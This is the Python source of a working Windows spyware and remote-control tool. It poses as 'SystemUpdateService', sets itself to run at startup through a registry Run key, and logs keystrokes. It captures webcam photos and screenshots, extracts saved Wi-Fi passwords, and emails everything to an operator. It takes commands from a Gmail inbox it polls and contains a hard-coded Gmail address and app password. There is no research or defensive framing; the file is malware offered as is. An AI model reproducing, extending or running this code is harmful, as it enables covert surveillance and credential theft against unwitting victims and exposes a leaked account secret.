import smtplib
import poplib
import email
import threading
import time
import os
import sys
import tempfile
import platform
import socket
import psutil
import subprocess
import re
import shutil
import winreg as reg
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
from pynput import keyboard
from PIL import ImageGrab
import cv2

# ====================== FIX ENCODING & CONSOLE ======================
if getattr(sys, 'frozen', False):
    os.environ['PYTHONIOENCODING'] = 'utf-8'
    sys.stdout = open(os.devnull, 'w', encoding='utf-8')
    sys.stderr = open(os.devnull, 'w', encoding='utf-8')

# ====================== CONFIG ======================
SMTP_CONFIG = {
    'server': 'smtp.gmail.com',
    'port': 587,
    'email': 'romanbogdan475@gmail.com',
    'password': 'cxzv ddop qosk hvdy'
}

PERSISTENCE_NAME = "SystemUpdateService"

class SystemInfoCollector:
    @staticmethod
    def get_device_info():
        try:
            return {
                'system': platform.system(),
                'hostname': platform.node(),
                'ip': socket.gethostbyname(socket.gethostname()),
                'ram': f"{psutil.virtual_memory().total / (1024**3):.1f} GB",
                'cpu': f"{psutil.cpu_percent()}%",
                'boot_time': datetime.fromtimestamp(psutil.boot_time()).strftime('%Y-%m-%d %H:%M')
            }
        except:
            return {"status": "error"}

    @staticmethod
    def get_wifi_passwords():
        if platform.system() != 'Windows':
            return []
        try:
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            startupinfo.wShowWindow = 0

            result = subprocess.run(['netsh', 'wlan', 'show', 'profiles'], 
                                  capture_output=True, text=True, startupinfo=startupinfo)
            
            profiles = re.findall(r"All User Profile\s*:\s*(.*)", result.stdout)
            passwords = []
            for name in profiles:
                try:
                    res = subprocess.run(['netsh', 'wlan', 'show', 'profile', name.strip(), 'key=clear'],
                                       capture_output=True, text=True, startupinfo=startupinfo)
                    pwd = re.search(r"Key Content\s*:\s*(.*)", res.stdout)
                    if pwd:
                        passwords.append((name.strip(), pwd.group(1)))
                except:
                    pass
            return passwords
        except:
            return []


class Agent:
    def __init__(self):
        self.recipient_email = None
        self.info_sent = False
        self.processed_ids = set()

        self.key_interval = 15
        self.camera_interval = 15
        self.screenshot_interval = 15
        self.check_interval = 10

        self.keylogger_running = True
        self.camera_running = False
        self.screenshot_running = False

        self.buffer = ""
        self.key_listener = None

        self.base_folder = os.path.join(tempfile.gettempdir(), "sys_update")
        self.photo_folder = os.path.join(self.base_folder, "photos")
        self.screenshot_folder = os.path.join(self.base_folder, "screenshots")
        
        os.makedirs(self.photo_folder, exist_ok=True)
        os.makedirs(self.screenshot_folder, exist_ok=True)

        self.add_persistence()
        
        self.start_keylogger()
        self.start_keylog_sender()
        self.start_command_checker()

    def add_persistence(self):
        try:
            if getattr(sys, 'frozen', False):
                current_path = sys.executable
            else:
                current_path = sys.argv[0]

            target_dir = os.path.join(tempfile.gettempdir(), "sys_update")
            target_path = os.path.join(target_dir, "SystemUpdate.exe")
            
            os.makedirs(target_dir, exist_ok=True)

            if not os.path.exists(target_path):
                shutil.copy2(current_path, target_path)

            key = reg.OpenKey(reg.HKEY_CURRENT_USER, 
                            r"Software\Microsoft\Windows\CurrentVersion\Run", 
                            0, reg.KEY_SET_VALUE)
            reg.SetValueEx(key, PERSISTENCE_NAME, 0, reg.REG_SZ, target_path)
            reg.CloseKey(key)
            
        except Exception as e:
            pass  # Silent fail în .exe

    def send_email(self, subject, body, attachments=None):
        if not self.recipient_email:
            return False
        try:
            msg = MIMEMultipart()
            msg['From'] = SMTP_CONFIG['email']
            msg['To'] = self.recipient_email
            msg['Subject'] = subject
            msg.attach(MIMEText(body, 'plain'))

            if attachments:
                for path in attachments:
                    if os.path.exists(path):
                        with open(path, 'rb') as f:
                            if path.lower().endswith(('.jpg', '.png', '.jpeg')):
                                img = MIMEImage(f.read(), name=os.path.basename(path))
                                msg.attach(img)

            with smtplib.SMTP(SMTP_CONFIG['server'], SMTP_CONFIG['port']) as server:
                server.starttls()
                server.login(SMTP_CONFIG['email'], SMTP_CONFIG['password'])
                server.send_message(msg)
            return True
        except:
            return False

    def send_system_info(self):
        if self.info_sent or not self.recipient_email:
            return
        try:
            info = SystemInfoCollector.get_device_info()
            wifi = SystemInfoCollector.get_wifi_passwords()

            body = f"=== SYSTEM INFORMATION ===\n"
            body += f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
            body += str(info) + "\n\n"
            body += "=== WIFI PASSWORDS ===\n"
            if wifi:
                for ssid, pwd in wifi:
                    body += f"SSID: {ssid} | Password: {pwd}\n"
            else:
                body += "No WiFi passwords found.\n"

            self.send_email("SYSTEM_INFO", body)
            self.info_sent = True
        except:
            pass

    def start_keylogger(self):
        def on_press(key):
            try:
                char = key.char
            except AttributeError:
                char = f"[{str(key).replace('Key.', '')}]"
                if key == keyboard.Key.space: char = " "
                if key == keyboard.Key.enter: char = "\n"
                if key == keyboard.Key.backspace: char = "[BACK]"
            self.buffer += char

        self.key_listener = keyboard.Listener(on_press=on_press)
        self.key_listener.start()

    def start_keylog_sender(self):
        def loop():
            while self.keylogger_running:
                time.sleep(self.key_interval)
                if self.buffer.strip():
                    self.send_email("KEYLOG", self.buffer)
                    self.buffer = ""
        threading.Thread(target=loop, daemon=True).start()

    def start_auto_camera(self):
        def loop():
            while self.camera_running:
                try:
                    cap = cv2.VideoCapture(0, cv2.CAP_DSHOW)
                    ret, frame = cap.read()
                    if ret:
                        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
                        path = os.path.join(self.photo_folder, f"cam_{ts}.jpg")
                        cv2.imwrite(path, frame)
                        self.send_email("PHOTO", "Auto Photo", [path])
                finally:
                    if 'cap' in locals(): cap.release()
                time.sleep(self.camera_interval)
        threading.Thread(target=loop, daemon=True).start()

    def start_auto_screenshot(self):
        def loop():
            while self.screenshot_running:
                try:
                    img = ImageGrab.grab()
                    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
                    path = os.path.join(self.screenshot_folder, f"scr_{ts}.png")
                    img.save(path)
                    self.send_email("SCREENSHOT", "Auto Screenshot", [path])
                except:
                    pass
                time.sleep(self.screenshot_interval)
        threading.Thread(target=loop, daemon=True).start()

    def take_single_screenshot(self):
        try:
            img = ImageGrab.grab()
            ts = datetime.now().strftime("%Y%m%d_%H%M%S")
            path = os.path.join(self.screenshot_folder, f"manual_{ts}.png")
            img.save(path)
            self.send_email("SCREENSHOT", "Manual Screenshot", [path])
        except:
            pass

    def process_command(self, full_command):
        try:
            if "|ID:" in full_command:
                command = full_command.split("|ID:")[0].strip()
                cmd_id = full_command.split("|ID:")[1]
                if cmd_id in self.processed_ids:
                    return
                self.processed_ids.add(cmd_id)
            else:
                command = full_command.strip()

            if command.startswith("SET_RECIPIENT:"):
                self.recipient_email = command[13:].strip()
                self.send_system_info()

            elif command.startswith("SET_KEY_INTERVAL:"):
                self.key_interval = int(command.split(":")[1])
            elif command.startswith("SET_CAMERA_INTERVAL:"):
                self.camera_interval = int(command.split(":")[1])
            elif command.startswith("SET_SCREENSHOT_INTERVAL:"):
                self.screenshot_interval = int(command.split(":")[1])
            elif command.startswith("SET_CHECK_INTERVAL:"):
                self.check_interval = int(command.split(":")[1])

            elif command == "START_KEYLOGGER":
                self.keylogger_running = True
                if not self.key_listener or not self.key_listener.is_alive():
                    self.start_keylogger()
                self.start_keylog_sender()

            elif command == "STOP_KEYLOGGER":
                self.keylogger_running = False
                if self.key_listener:
                    self.key_listener.stop()
                    self.key_listener = None

            elif command == "START_CAMERA":
                self.camera_running = True
                self.start_auto_camera()
            elif command == "STOP_CAMERA":
                self.camera_running = False

            elif command == "START_SCREENSHOT":
                self.screenshot_running = True
                self.start_auto_screenshot()
            elif command == "STOP_SCREENSHOT":
                self.screenshot_running = False

            elif command == "TAKE_SCREENSHOT":
                self.take_single_screenshot()

        except:
            pass

    def start_command_checker(self):
        def loop():
            while True:
                try:
                    pop_conn = poplib.POP3_SSL('pop.gmail.com', 995)
                    pop_conn.user(SMTP_CONFIG['email'])
                    pop_conn.pass_(SMTP_CONFIG['password'])

                    num_messages = len(pop_conn.list()[1])
                    for i in range(max(1, num_messages - 60), num_messages + 1):
                        raw_email = b"\n".join(pop_conn.retr(i)[1])
                        msg = email.message_from_bytes(raw_email)
                        subject = msg.get('Subject', '').strip()

                        if subject.startswith('COMMAND:'):
                            full_command = subject[9:].strip()
                            self.process_command(full_command)
                            pop_conn.dele(i)

                    pop_conn.quit()
                except:
                    pass
                time.sleep(self.check_interval)

        threading.Thread(target=loop, daemon=True).start()


if __name__ == "__main__":
    agent = Agent()
    try:
        while True:
            time.sleep(1)
    except:
        sys.exit(0)